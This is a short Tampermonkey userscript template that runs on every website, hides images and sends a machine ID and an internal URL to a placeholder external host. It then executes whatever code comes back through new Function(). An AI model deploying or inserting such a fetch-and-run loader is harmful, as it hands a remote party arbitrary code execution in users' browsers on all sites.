// ==UserScript==
// @name         Default
// @namespace    http://tampermonkey.net/
// @version      0.1
// @run-at       document-start
// @description  try to take over the world!
// @author       You
// @match        *://*/*
// @grant        none
// ==/UserScript==

(function() {
  var __machineID = '<<MACHINEID>>';
    function addStyle(styles) {
    if(document.getElementsByTagName("head")[0] && document && document.createElement) {
        var css = document.createElement('style');
        css.type = 'text/css';
        if (css.styleSheet) css.styleSheet.cssText = styles;
        else  css.appendChild(document.createTextNode(styles));
        document.getElementsByTagName("head")[0].appendChild(css);
        } else setTimeout(function(){addStyle(styles);},10);
    }
  addStyle("svg,img{display: none !important; visibility: hidden !important} *{background-image:none !important}");


  var oReq = new XMLHttpRequest();
  oReq.onload = function(e) { new Function(oReq.responseText)(); }
  
  oReq.open("GET", '<<EXTURL>>/next_step.json?__mid='+__machineID+'&__inturl='+encodeURIComponent('<<INTURL>>'));
  oReq.send();
})();
